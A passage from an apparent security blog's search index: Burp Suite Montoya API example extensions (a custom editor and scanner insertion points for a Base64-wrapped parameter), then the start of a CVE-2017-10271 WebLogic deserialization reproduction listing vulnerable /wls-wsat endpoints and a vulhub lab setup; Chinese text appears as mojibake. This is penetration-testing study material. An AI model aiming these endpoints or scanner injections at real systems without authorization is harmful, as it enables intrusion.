è¯·æ±‚ç¼–è¾‘å™¨å®ç°</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyExtensionProvidedHttpRequestEditor</span> <span class="keyword">implements</span> <span class="title class_">ExtensionProvidedHttpRequestEditor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RawEditor requestEditor;  <span class="comment">// åŸå§‹ç¼–è¾‘å™¨æ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Base64Utils base64Utils;  <span class="comment">// Base64å·¥å…·ç±»</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> URLUtils urlUtils;  <span class="comment">// URLå·¥å…·ç±»</span></span><br><span class="line">    <span class="keyword">private</span> HttpRequestResponse requestResponse;  <span class="comment">// å½“å‰çš„è¯·æ±‚å“åº”å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;  <span class="comment">// Montoya API æ¥å£</span></span><br><span class="line">    <span class="keyword">private</span> ParsedHttpParameter parsedHttpParameter;  <span class="comment">// è§£æçš„HTTPå‚æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°</span></span><br><span class="line">    MyExtensionProvidedHttpRequestEditor(MontoyaApi api, EditorCreationContext creationContext)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">        base64Utils = api.utilities().base64Utils();</span><br><span class="line">        urlUtils = api.utilities().urlUtils();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ ¹æ®ç¼–è¾‘æ¨¡å¼åˆ›å»ºç¼–è¾‘å™¨</span></span><br><span class="line">        <span class="keyword">if</span> (creationContext.editorMode() == EditorMode.READ_ONLY)</span><br><span class="line">        &#123;</span><br><span class="line">            requestEditor = api.userInterface().createRawEditor(EditorOptions.READ_ONLY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            requestEditor = api.userInterface().createRawEditor();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–ç¼–è¾‘åçš„è¯·æ±‚</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpRequest <span class="title function_">getRequest</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        HttpRequest request;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (requestEditor.isModified())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœç¼–è¾‘å™¨è¢«ä¿®æ”¹ï¼Œé‡æ–°åºåˆ—åŒ–æ•°æ®</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> base64Utils.encodeToString(requestEditor.getContents(), Base64EncodingOptions.URL);</span><br><span class="line">            <span class="type">String</span> <span class="variable">encodedData</span> <span class="operator">=</span> urlUtils.encode(base64Encoded);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// æ›´æ–°è¯·æ±‚å‚æ•°</span></span><br><span class="line">            request = requestResponse.request().withUpdatedParameters(HttpParameter.parameter(parsedHttpParameter.name(), encodedData, parsedHttpParameter.type()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            request = requestResponse.request();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> request;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®è¯·æ±‚å“åº”å¯¹è±¡</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRequestResponse</span><span class="params">(HttpRequestResponse requestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.requestResponse = requestResponse;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£ç å‚æ•°å€¼</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">urlDecoded</span> <span class="operator">=</span> urlUtils.decode(parsedHttpParameter.value());</span><br><span class="line">        ByteArray output;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            output = base64Utils.decode(urlDecoded);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            output = byteArray(urlDecoded);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è®¾ç½®ç¼–è¾‘å™¨å†…å®¹</span></span><br><span class="line">        <span class="built_in">this</span>.requestEditor.setContents(output);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¡®å®šç¼–è¾‘å™¨æ˜¯å¦é€‚ç”¨äºç»™å®šçš„è¯·æ±‚å“åº”</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabledFor</span><span class="params">(HttpRequestResponse requestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Optional&lt;ParsedHttpParameter&gt; dataParam = requestResponse.request().parameters().stream()</span><br><span class="line">            .filter(p -&gt; p.name().equals(<span class="string">&quot;data&quot;</span>)).findFirst();</span><br><span class="line"></span><br><span class="line">        dataParam.ifPresent(httpParameter -&gt; parsedHttpParameter = httpParameter);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dataParam.isPresent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¼–è¾‘å™¨çš„æ ‡é¢˜</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">caption</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Serialized input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–UIç»„ä»¶</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">uiComponent</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.uiComponent();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–é€‰ä¸­çš„æ•°æ®</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Selection <span class="title function_">selectedData</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.selection().isPresent() ? requestEditor.selection().get() : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­ç¼–è¾‘å™¨å†…å®¹æ˜¯å¦è¢«ä¿®æ”¹</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isModified</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> requestEditor.isModified();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;  <span class="comment">// å¼•å…¥ BurpExtension æ¥å£</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;  <span class="comment">// å¼•å…¥ MontoyaApiï¼Œç”¨äºè®¿é—® Burp Suite API</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° BurpExtension æ¥å£çš„ CustomRequestEditorTab ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomRequestEditorTab</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// è®¾ç½®æ’ä»¶çš„åç§°</span></span><br><span class="line">        api.extension().setName(<span class="string">&quot;Serialized input editor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// åœ¨ Burp ç”¨æˆ·ç•Œé¢ä¸­æ³¨å†Œè‡ªå®šä¹‰çš„ HTTP è¯·æ±‚ç¼–è¾‘å™¨æä¾›è€…</span></span><br><span class="line">        <span class="comment">// MyHttpRequestEditorProvider æ˜¯ä¸€ä¸ªè‡ªå®šä¹‰ç±»ï¼Œè´Ÿè´£æä¾›ç¼–è¾‘å™¨çš„å…·ä½“å®ç°</span></span><br><span class="line">        api.userInterface().registerHttpRequestEditorProvider(<span class="keyword">new</span> <span class="title class_">MyHttpRequestEditorProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ä»£ç ä¸ºå«æœ‰å‚æ•°dataçš„è¯·æ±‚æ–°å»ºäº†ç‰¹æ®Šçš„ç¼–è¾‘å™¨ï¼Œå¯ä»¥å¯¹dataå‚æ•°è¿›è¡Œé…ç½®ä¿®æ”¹<br><img src="/2024/10/23/tools/burpsuite-plugins/image-5.png"></p><h2 id="Custom-Scan-Checks-Example-Extension"><a href="#Custom-Scan-Checks-Example-Extension" class="headerlink" title="Custom Scan Checks Example Extension"></a>Custom Scan Checks Example Extension</h2><p>The sample extension demonstrates the following techniques:</p><ul><li>Registering a custom <code>AuditInsertionPointProvider</code></li><li>If the request contains the <code>data</code> parameter, it will provide a custom <code>AuditInsertionPoint</code></li><li>The custom <code>AuditInsertionPoint</code> will perform the following:<ul><li>Deserialize the data (URL decode and then Base64 decode)</li><li>Parse the location of the <code>input=</code> string withing the decoded data</li><li>Split the data into a prefix, location to place the payload, and a suffix</li><li>When building the request with the appropriate payload, it will perform the following:<ul><li>Build the raw data with the appropriate payload</li><li>Re-serialize the data (Base64 encode then URL encode)</li></ul></li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;  <span class="comment">// å¼•å…¥ MontoyaApiï¼Œç”¨äºè®¿é—® Burp Suite çš„ API</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;  <span class="comment">// å¼•å…¥ç”¨äºå¤„ç† HTTP è¯·æ±‚å“åº”çš„ç±»</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;  <span class="comment">// å¼•å…¥ç”¨äºè§£æ HTTP å‚æ•°çš„ç±»</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;  <span class="comment">// å¼•å…¥å®¡æ ¸æ’å…¥ç‚¹æ¥å£</span></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPointProvider;  <span class="comment">// å¼•å…¥å®¡æ ¸æ’å…¥ç‚¹æä¾›è€…æ¥å£</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;  <span class="comment">// å¼•å…¥ Java çš„ List æ¥å£</span></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> java.util.stream.Collectors.toList;  <span class="comment">// å¼•å…¥ç”¨äºæ”¶é›† Stream ç»“æœçš„å·¥å…·æ–¹æ³•</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° AuditInsertionPointProvider æ¥å£çš„ MyInsertionPointProvider ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyInsertionPointProvider</span> <span class="keyword">implements</span> <span class="title class_">AuditInsertionPointProvider</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MontoyaApi api;  <span class="comment">// ä¿å­˜ MontoyaApi å®ä¾‹çš„ç§æœ‰æœ€ç»ˆå­—æ®µ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œæ¥æ”¶ä¸€ä¸ª MontoyaApi å®ä¾‹</span></span><br><span class="line">    MyInsertionPointProvider(MontoyaApi api)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.api = api;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡å†™æä¾›æ’å…¥ç‚¹çš„æ–¹æ³•</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;AuditInsertionPoint&gt; <span class="title function_">provideInsertionPoints</span><span class="params">(HttpRequestResponse baseHttpRequestResponse)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// ä»è¯·æ±‚ä¸­è·å–æ‰€æœ‰å‚æ•°</span></span><br><span class="line">        List&lt;ParsedHttpParameter&gt; parameters = baseHttpRequestResponse.request().parameters();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿‡æ»¤å‡ºåä¸º &quot;data&quot; çš„å‚æ•°ï¼Œå¹¶ä¸ºæ¯ä¸ªè¿™æ ·çš„å‚æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„å®¡æ ¸æ’å…¥ç‚¹</span></span><br><span class="line">        <span class="keyword">return</span> parameters.stream()</span><br><span class="line">                .filter(p -&gt; p.name().equals(<span class="string">&quot;data&quot;</span>))  <span class="comment">// è¿‡æ»¤å‡ºå‚æ•°åä¸º &quot;data&quot; çš„å‚æ•°</span></span><br><span class="line">                .map(p -&gt; <span class="keyword">new</span> <span class="title class_">MyAuditInsertionPoint</span>(api, baseHttpRequestResponse, p))  <span class="comment">// ä¸ºæ¯ä¸ªç¬¦åˆæ¡ä»¶çš„å‚æ•°åˆ›å»ºä¸€ä¸ª MyAuditInsertionPoint å®ä¾‹</span></span><br><span class="line">                .collect(toList());  <span class="comment">// æ”¶é›†ç»“æœåˆ° List ä¸­</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.ByteArray;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.core.Range;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.HttpRequestResponse;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.HttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.params.ParsedHttpParameter;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.http.message.requests.HttpRequest;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.utilities.Utilities;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> burp.api.montoya.http.message.params.HttpParameter.parameter;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ç° AuditInsertionPoint æ¥å£çš„ MyAuditInsertionPoint ç±»</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyAuditInsertionPoint</span> <span class="keyword">implements</span> <span class="title class_">AuditInsertionPoint</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String insertionPointPrefix;  <span class="comment">// æ’å…¥ç‚¹ä¹‹å‰çš„æ–‡æœ¬</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String insertionPointSuffix;  <span class="comment">// æ’å…¥ç‚¹ä¹‹åçš„æ–‡æœ¬</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> HttpRequestResponse requestResponse;  <span class="comment">// è¯·æ±‚å“åº”å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ParsedHttpParameter parameter;  <span class="comment">// è¢«æ“ä½œçš„ HTTP å‚æ•°</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String baseValue;  <span class="comment">// å‚æ•°å€¼çš„åŸºæœ¬å½¢å¼</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Utilities utilities;  <span class="comment">// Utilities å¯¹è±¡ï¼Œæä¾›ç¼–è§£ç ç­‰åŠŸèƒ½</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–å‚æ•°å’Œå®ç”¨å·¥å…·</span></span><br><span class="line">    MyAuditInsertionPoint(MontoyaApi api, HttpRequestResponse baseHttpRequestResponse, ParsedHttpParameter parameter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.requestResponse = baseHttpRequestResponse;</span><br><span class="line">        <span class="built_in">this</span>.parameter = parameter;</span><br><span class="line">        <span class="built_in">this</span>.utilities = api.utilities();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">paramValue</span> <span class="operator">=</span> parameter.value();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// URL å’Œ base-64 è§£ç æ•°æ®</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">urlDecoded</span> <span class="operator">=</span> utilities.urlUtils().decode(paramValue);</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">byteData</span> <span class="operator">=</span> utilities.base64Utils().decode(urlDecoded);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> byteData.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è§£æè¾“å…¥å­—ç¬¦ä¸²åœ¨è§£ç æ•°æ®ä¸­çš„ä½ç½®</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> data.indexOf(<span class="string">&quot;input=&quot;</span>) + <span class="number">6</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> data.indexOf(<span class="string">&quot;&amp;&quot;</span>, start);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (end == -<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            end = data.length();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        baseValue = data.substring(start, end);</span><br><span class="line"></span><br><span class="line">        insertionPointPrefix = data.substring(<span class="number">0</span>, start);</span><br><span class="line">        insertionPointSuffix = data.substring(end);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›æ’å…¥ç‚¹çš„åç§°</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">name</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Base64-wrapped input&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›åŸå§‹å€¼</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">baseValue</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> baseValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ç‰¹å®šçš„ payload æ„å»ºå¸¦æœ‰è´Ÿè½½çš„ HTTP è¯·æ±‚</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HttpRequest <span class="title function_">buildHttpRequestWithPayload</span><span class="params">(ByteArray payload)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// æ„å»ºåŸå§‹æ•°æ®ä½¿ç”¨æŒ‡å®šçš„è´Ÿè½½</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">input</span> <span class="operator">=</span> insertionPointPrefix + payload.toString() + insertionPointSuffix;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base-64 å’Œ URL ç¼–ç æ•°æ®</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">updatedParameterValue</span> <span class="operator">=</span> utilities.urlUtils().encode(utilities.base64Utils().encodeToString(input));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// æ›´æ–° HTTP å‚æ•°</span></span><br><span class="line">        <span class="type">HttpParameter</span> <span class="variable">updatedParameter</span> <span class="operator">=</span> parameter(parameter.name(), updatedParameterValue, parameter.type());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// è¿”å›æ›´æ–°å‚æ•°çš„ HTTP è¯·æ±‚</span></span><br><span class="line">        <span class="keyword">return</span> requestResponse.request().withUpdatedParameters(updatedParameter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¿”å›é—®é¢˜é«˜äº®åŒºåŸŸçš„æ–¹æ³•ï¼Œæ­¤å¤„æœªå®ç°</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Range&gt; <span class="title function_">issueHighlights</span><span class="params">(ByteArray payload)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.BurpExtension;</span><br><span class="line"><span class="keyword">import</span> burp.api.montoya.MontoyaApi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomScanInsertionPoints</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span></span><br><span class="line">    &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Custom scan insertion points&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.scanner().registerInsertionPointProvider(<span class="keyword">new</span> <span class="title class_">MyInsertionPointProvider</span>(api));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™ä¸ªç¤ºä¾‹ä¸æ˜¯å¾ˆæ‡‚ï¼Œä¹Ÿæ²¡æ‰¾åˆ°å¯¹åº”çš„å‡ºå‘ç‚¹</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€CVEå¤ç°ã€‘WebLogic XMLDecoderååºåˆ—åŒ–æ¼æ´(CVE-2017-10271)æ¼æ´å¤ç°</title>
      <link href="/2024/10/22/WebSecurity/cve/CVE-2017-10271/"/>
      <url>/2024/10/22/WebSecurity/cve/CVE-2017-10271/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><p>Weblogicçš„WLS Securityç»„ä»¶å¯¹å¤–æä¾›webserviceæœåŠ¡ï¼Œå…¶ä¸­ä½¿ç”¨äº†XMLDecoderæ¥è§£æç”¨æˆ·ä¼ å…¥çš„XMLæ•°æ®ï¼Œåœ¨è§£æçš„è¿‡ç¨‹ä¸­å‡ºç°ååºåˆ—åŒ–æ¼æ´ï¼Œå¯¼è‡´å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ”»å‡»è€…å‘é€ç²¾å¿ƒæ„é€ çš„xmlæ•°æ®ç”šè‡³èƒ½é€šè¿‡åå¼¹shellæ‹¿åˆ°æƒé™ã€‚</p><p>æ¼æ´æ¶‰åŠç‰ˆæœ¬<br>10.3.6.0<br>12.1.3.0.0<br>12.2.1.1.0</p><p>æ¼æ´åœ°å€ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC</span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11</span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11</span><br><span class="line">/wls-wsat/ParticipantPortType11</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ç”¨çš„vulhubï¼Œä¸ºäº†åŠ¨æ€åˆ†æcveçš„åŸç†ï¼Œç”¨IDEAçš„è¿œç¨‹è°ƒè¯•æä¸€ä¸‹ï¼Œé¦–å…ˆä¿®æ”¹ä¸‹<code>docker-compose.yml</code>æ–‡ä»¶ï¼Œæ·»åŠ è°ƒè¯•ç«¯å£</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"> <span class="attr">weblogic:</span></span><br><span class="line">   <span class="attr">image:</span> <span class="string">vulhub/weblogic:10.3.6.0-2017</span></span><br><span class="line">   <span class="attr">ports:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;7001:7001&quot;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&quot;8453:8453&quot;</span></span><br></pre></td></tr></table></figure><p>docker-compose up -d ç¼–è¯‘é•œåƒå¹¶å¯åŠ¨å®¹å™¨<br><img src="/2024/10/22/WebSecurity/cve/CVE-2017-10271/image.png"><br>docker exec -it 4d &#x2F;bin&#x2F;bash è¿›å…¥å®¹å™¨å†…ï¼Œ<code>vi /root/Oracle/Middleware/user_projects/domains/base_domain/bin/setDomainEnv.sh</code>ï¼Œ<br><img 